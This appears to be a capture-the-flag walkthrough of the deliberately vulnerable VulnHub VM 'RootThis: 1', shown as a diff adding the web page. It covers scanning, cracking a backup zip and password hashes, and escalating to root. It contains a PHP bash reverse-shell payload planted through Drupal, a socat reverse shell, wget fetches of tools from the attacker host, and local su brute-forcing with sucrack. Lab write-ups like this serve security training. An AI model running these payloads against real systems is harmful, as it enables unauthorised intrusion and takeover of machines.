@@ -1,0 +1,86 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Vulnhub: RootThis: 1 Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/vulnhub-rootthis-1-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-03-01T09:02:08+00:00">March 1, 2019</time><time class="updated" datetime="2025-06-10T20:11:53+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello friends! Today we are going to take another boot2root challenge known as </span>root this<span style="color: #000000;">. The credit for making this VM machine goes to “Fred </span>Wemeijer<span style="color: #000000;">” and it is another boot2root challenge in which our goal is to get root access to complete the challenge. You can download this VM <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/rootthis-1,272/#download">here</a></span></strong>.</span></p>
+<p><span style="color: #000000;"><strong>Security Level</strong>: Intermediate</span></p>
+<p><span style="color: #000000;"><strong>Flags</strong>: There is one flag (flag.txt).</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">IP Discovery using netdiscover</span></li>
+<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
+<li><span style="color: #000000;">Surfing HTTP service port (80)</span></li>
+<li><span style="color: #000000;">Directory enumeration using dirb</span></li>
+<li><span style="color: #000000;">Getting Backup file using wget</span></li>
+<li><span style="color: #000000;">Cracking password using </span>fcrackzip</li>
+<li><span style="color: #000000;">Cracking Hashes using John the Ripper</span></li>
+<li><span style="color: #000000;">Getting Reverse Shell</span></li>
+<li><span style="color: #000000;">Getting a proper TTY shell using socat</span></li>
+<li><span style="color: #000000;">Cracking root password using </span>sucrack</li>
+<li><span style="color: #000000;">Retrieving flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
+<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0UyABN35Rn8/XHecx8p28BI/AAAAAAAAdFU/IQ3uP50bcUk5Ww9vSRHbpDUckJK82-MiQCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">We found our target –&gt; 192.168.1.135</span></p>
+<p><span style="color: #000000;">Our next step is to scan our target with nmap.</span></p>
+<pre class="lang:default decode:true">nmap -p- -A 192.168.1.135</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-otibW4tG9Lg/XHec0PlTjOI/AAAAAAAAdF4/2IUIwC3k3o8B8wZ7uvcRhDZOtOqOzQwKwCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">The NMAP output shows us that there is only 1 port open: 80(HTTP)</span></p>
+<p><span style="color: #000000;">We find that port 80 is running http, so we open the IP in our browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iNSWM1RL3BA/XHec0bmP1lI/AAAAAAAAdF8/RHweAnGz1dAJA2eVuDW0oOpxDHykBNYBwCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">We don’t find anything on the webpage, so we use dirb to enumerate the directories on the web server.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.135/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-9dmHzbxwaxw/XHec0V5JD2I/AAAAAAAAdGA/pV-xVMG0CAELv5zjiS8r4tKm7b_UTXRiACLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">We find two interesting directories called “backup” and “</span>drupal<span style="color: #000000;">”. We open the “/drupal” directory and find a Drupal CMS login page. We are unable to </span>login<span style="color: #000000;"> or find any vulnerability on the CMS.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-0e7IgkClbPE/XHec0hjelmI/AAAAAAAAdGE/6PJe8nydwPYmJb9ATIiRHkaHMx-Tlzu8wCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">We try to open </span>the “<span style="color: #000000;">backup/” directory and find that it is a file. So we use “wget” to download the file on our system. After downloading the file, we find that is a ZIP file. When we tried to extract it we are prompted for a password. To brute </span>force<span style="color: #000000;">, the password protected file we can use a tool called “</span>fcrackzip<span style="color: #000000;">”. After getting the password for the ZIP file we extract the data and find a SQL file.</span></p>
+<pre class="lang:default decode:true">wget http://192.168.1.135/backup
+file backup
+frackzip -D -v -u -p /usr/share/wordlists/rockyou.txt backup
+unzip backup
+cat dump.sql</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Bpkeu_YZtCg/XHec0-Xr5oI/AAAAAAAAdGI/d7wM5weEFa8CoPbgpnM8ZvsgSmZq61fhgCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Searching through </span>the content<span style="color: #000000;"> of the SQL file, we find 2 usernames and their password hashes.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-O8rAGwnDRrk/XHec1FrI-KI/AAAAAAAAdGM/nOgUxGcOcIsdOqCaS4B2xqF3SvEvWKA0ACLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">We save the hashes in a file and then use john the ripper to crack the hashes. We are successfully able to crack the hash and get the password for the user “</span>webman<span style="color: #000000;">”.</span></p>
+<pre class="lang:default decode:true">john hashes --wordlist=/usr/share/wordlists/rockyou.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-DS4Y6bqjl34/XHec1hGXJoI/AAAAAAAAdGQ/y0JrujHtY24n3HeRHLqA2KgGBtA4kn92ACLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">We use the credentials “</span>webman<span style="color: #000000;">: </span>moranguita<span style="color: #000000;">” to </span>login<span style="color: #000000;"> through Drupal CMS and are successfully able to </span>login<span style="color: #000000;">.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3VFQ67OekCo/XHec10XIbeI/AAAAAAAAdGU/DXLU6d5NOAc5TuHJ7hIrjougQyklTu78gCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">To get a reverse shell of the target system, we go to add content and add the following php code to get a revere shell:</span></p>
+<pre class="lang:default decode:true">&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.107/1234 0&gt;&amp;1'");</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-LZNJ7spAiaU/XHecyFWcJDI/AAAAAAAAdFY/P5mVXRfbigAO6cWGmppMnmrMardSXW48QCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">We </span>set up<span style="color: #000000;"> our listener and as soon as we click on save on the CMS we get a reverse shell. Enumerating the target system; inside “/home/user” directory we find a file called “MessageToRoot.txt”. We open the file and find it has </span>hinted<span style="color: #000000;"> that the root password is inside the first 300 words of the rockyou.txt. We try to “su” command and find that we don’t have a proper TTY shell to run the command.</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-AUugcnTzglY/XHecx8r2U4I/AAAAAAAAdFc/Hu6dZzMSqpgJCCEd_zweueYqKmCGQ3dngCLcBGAs/s1600/12.png"/></strong>We tried multiple ways to get a TTY shell, but are unable to spawn one with </span>an available<span style="color: #000000;"> application on the target machine. So we upload socat on the target machine to get a TTY shell. (Download socat from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">here</a></span>)</span></p>
+<pre class="lang:default decode:true">wget http://192.168.1.107/socat
+./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.107:4567</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-f6bsEggSjig/XHecyjd7S-I/AAAAAAAAdFg/Mg0z4qkn2j0I4j3H28A66UvruJV8oe7xgCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">We start a listener on our local </span>system<span style="color: #000000;"> and are able to get a reverse shell. We run “su” command and find that we are able to spawn a TTY shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-W7x6mUjZ3WY/XHecy4wJNuI/AAAAAAAAdFk/HU7LloSz34kv5oH-Ei1m4_E38Z5lDIWOACLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Now we create a dictionary with the first 300 words of rockyou.txt.</span></p>
+<pre class="lang:default decode:true">head -n 300 /usr/share/wordlists/rockyou.txt &gt; dict.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-WtVPjgWFGBM/XHecywdjXYI/AAAAAAAAdFo/ZyKxza9Wi74gyROPdSw8F8x5QiEKdQ9mACLcBGAs/s1600/15.1.png"/></span></p>
+<p><span style="color: #000000;">Now as there is SSH running on the target machine, we cannot brute force the username and password. </span>Instead<span style="color: #000000;">, we can use a tool called “</span>sucrack<span style="color: #000000;">” that brute forces password locally through “su”. We download it in our system and extract it. Then we compile the application on our system as </span>it<span style="color: #000000;"> is not C-compiler on the target machine. After compiling the application, we archive the compiled application to upload it on the target machine. (You can find more information about </span>sucrack<span style="color: #000000;"> and download </span>sucrack<span style="color: #000000;"> from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://labs.portcullis.co.uk/tools/sucrack/">here</a></span>)</span></p>
+<pre class="lang:default decode:true">tar -xvf sucrack-1.2.3.tar.gz
+cd sucrack-1.2.3/
+./configure
+make
+tar -cvf sucrack.tar sucrack-1.2.3/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-MgaSRY_fk2I/XHeczYdk_1I/AAAAAAAAdFs/UFT5bEz7cnkdQVjJNyMZR-GxWNpduR0egCLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">We upload the dictionary file and the compiled application on the target system. We first start our python HTTP server using “SimpleHTTPServer” module and then use “wget” command on the target machine to download it from our local system. After downloading both the files we extracted the tar file.</span></p>
+<pre class="lang:default decode:true">wget http://192.168.1.107/sucrack.tar
+tar xvf sucrack.tar</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-u5O_BmxNOxg/XHeczogYY1I/AAAAAAAAdFw/IgZy4DXBobMWOX5tL0byI94aJFvHD1H0wCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">After extracting the tar file, we go to “sucrack1-2.3/src” directory as the compiled application is inside this directory and run the command to brute force the password. The application was successfully able to brute force the password for root user. We switched to root user and inside /root directory and we successfully able to get the flag.</span></p>
+<pre class="lang:default decode:true">./sucrack -u root -w 10 /tmp/dict.txt</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-dqqOYEZS7ow/XHecz74J9tI/AAAAAAAAdF0/zJF65cly_oMcQx7DXGB-I58m780g3SQKgCLcBGAs/s1600/17.png"/></strong></span></p>
+<p><strong>Author</strong>: Sushma Ahuja is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on <a href="https://www.linkedin.com/in/sushma-ahuja-284907157/"><strong>LinkedIn</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
